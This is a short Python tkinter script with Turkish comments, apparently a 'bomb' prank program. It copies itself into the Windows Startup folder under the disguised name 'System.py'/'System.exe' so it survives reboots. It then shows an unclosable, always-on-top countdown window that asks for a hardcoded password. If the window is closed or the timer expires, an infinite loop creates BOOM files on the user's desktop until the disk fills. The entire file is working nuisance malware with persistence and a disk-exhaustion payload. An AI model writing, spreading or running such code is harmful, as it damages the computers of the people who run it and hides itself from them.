# Kütüphaneler {
from tkinter import * # pencere kütüphanesi
import shutil # Windows'da erişim hatası almadan dosyalarla oynamak için
import sys 
import os 
# }

# Eğer bilgisayar kapanırsa otomatik olarak programın açılmasını sağlar {
kaynak_dosya = "main.py" # burada .exe dosyasının adını yazılması gerekiyor

# Bilgisayar kapandığında programın tekrar açılması için Startup klasörüne gidiyor
hedef_klasor = os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup") 

hedef_dosya = os.path.join(hedef_klasor, "System.py") # Dosyanın adını System.exe yapacak

shutil.copy2(kaynak_dosya, hedef_dosya) # copy2(programdaki tüm izinler vs. değişmeden) startup klasörüne atılacak
# startup kütüphanesi Windows açıldığı anda o dosyanın içeriğindeki dosyaları çalıştıran klasör
# }

Time = 120 # Süre belirlendi
sifre = "1845293" # Şifre

# Program masaüstüne getiriliyor {
hedef = os.environ["USERPROFILE"]
os.chdir(hedef)
hedef = os.chdir('OneDrive')

if "Masaüstü" in os.listdir():
    os.chdir("Masaüstü")

else:
    os.chdir("Desktop")
# }

# Ana patlama işlemi burada olacak {
def patla(event = None): 
    global Time, sifreEnt, sifre
    i = 0
    if Time <= 0:
        while True: # while True olacak
            i += 1
            with open(f'BOOM{i}.txt', 'a')as dosya: 
                pass
    else:
        pass
# }

# Program kapatılmaya çalışılırsa diye anında patlaması için {
def hemenPatla():
    i = 0
    while True: # while True olacak
        i += 1
        with open(f'BOOM{i}.txt', 'a')as dosya:
            pass 
# }

# Enter tuşu bekleniyor {
def bind_enter(event):
    global sifreEnt, Time
    if sifreEnt.get() == sifre:
        if os.path.exists(hedef_dosya):
            os.remove(hedef_dosya)
        bomba.destroy()
        sys.exit()
    else:
        Time -= 1
        bomba.bind('<Return>', bind_enter)
# }

bomba = Tk()
bomba.title('BOMBA!')
bomba.geometry("550x600")
bomba.configure(bg='#A96033')
bomba.resizable(width=False, height=False)

entryFrame = Frame(bomba, bg='#A96033')
sureFrame = Frame(bomba, bg='blue')
entryFrame.place(relx=0,rely=0.07,relwidth=1,relheight=0.1)
sureFrame.place(relx=0.4,rely=0,relwidth=0.2,relheight=0.07)

# Pencerenin temel işlevleri devre dışı bırakıldı {
bomba.protocol("WM_DELETE_WINDOW", False) # Pencerenin kapatılması engellendi
bomba.protocol("WM_DELETE_WINDOW", hemenPatla) # Eğer pencere kapatılmaya çalışılırsa anında patla fonksiyonu devreye girer
bomba.attributes("-toolwindow", 1) # Ekranı kaplama işlevi devre dışı bırakıldı
bomba.attributes("-topmost", 1) # Pencerenin simge durumuna düşmesi engellendi
# }

sure = Entry(sureFrame, bd=0, font='arial 30 bold', justify=CENTER)
sifreEnt = Entry(entryFrame, font='arial 36', bd=0, background='yellow', justify=CENTER)
sifreEnt.pack()
sure.pack()

bomba.bind('<FocusIn>', bind_enter) # Enter tuşuna basılırsa bind_enter fonksiyonu devreye girer

# Zamanlayıcı {
def update_timer():
    global Time
    minute = Time // 60
    second = Time % 60
    timer = "{:02d}:{:02d}".format(minute, second)
    sure.delete(0, END)  # Önceki değeri temizle
    sure.insert(0, timer)
    if Time > 0:
        Time -= 1  # Süreyi 1 azalt
        bomba.after(1000, update_timer) # 1 saniye sonra güncelle
        
    else: # zaman biterse olacaklar :
        bomba.destroy()
        patla()
# }

update_timer()
bomba.mainloop()
